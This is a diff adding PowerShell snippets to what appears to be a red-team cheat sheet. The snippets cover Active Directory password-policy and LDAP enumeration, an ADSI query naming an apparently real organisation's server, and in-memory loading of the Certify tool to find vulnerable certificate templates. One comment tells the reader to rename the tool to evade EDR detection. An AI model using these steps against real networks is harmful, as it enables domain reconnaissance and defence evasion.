@@ -98,3 +98,31 @@ wevtutil
 wmic
 xcopy
 
+
+#AD Password policy
+Get-ADDefaultDomainPasswordPolicy
+
+#Query an object with powershell
+$Group = [ADSI]"LDAP://CN=CGYMSDBP023,OU=Production,OU=Servers,DC=keyera,DC=com"
+$Group
+
+#LDAP Queries for red team engagements
+#https://www.politoinc.com/post/ldap-queries-for-offensive-and-defensive-operations
+$Filter="(cn=SERVERNAME)"
+$Searcher = New-Object DirectoryServices.DirectorySearcher
+$Searcher.SearchRoot = New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=domain,DC=com")
+$Searcher.Filter = $Filter
+$res = $Searcher.FindAll()
+$res.Properties
+
+
+#Load .net assemblies in memory
+#To avoid detection, replace the name of the utility everywhere in the code (works against Crowdstrike at least)
+#documented here:
+#https://github.com/GhostPack/Certify
+#Create a base64 encoded version of .net binary
+[Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Temp\Certify.exe")) | Out-File -Encoding ASCII C:\Temp\Certify.txt
+#Download or copy the base64 encoded string, then load into memory
+$CertifyAssembly = [System.Reflection.Assembly]::Load([Convert]::FromBase64String("aa..."))
+#Jump on the Module's entrypoint and provide arguments ("".Split() is necessary):
+[Certify.Program]::Main("find /vulnerable".Split())
